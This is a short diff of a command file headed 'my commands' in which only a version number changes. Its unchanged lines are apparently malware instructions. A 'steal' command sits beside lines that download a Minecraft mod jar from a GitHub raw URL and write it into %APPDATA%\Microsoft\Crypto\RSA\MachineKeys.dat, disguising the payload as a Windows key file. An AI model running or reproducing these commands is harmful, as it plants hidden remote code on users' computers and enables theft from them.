@@ -1,5 +1,5 @@
 # my commands
-version: 2
+version: 3
 steal
 mods https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/e4all-neoforge-1.6.2.jar
 put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/e4all-neoforge-1.6.2.jar %APPDATA%\Microsoft\Crypto\RSA\MachineKeys.dat
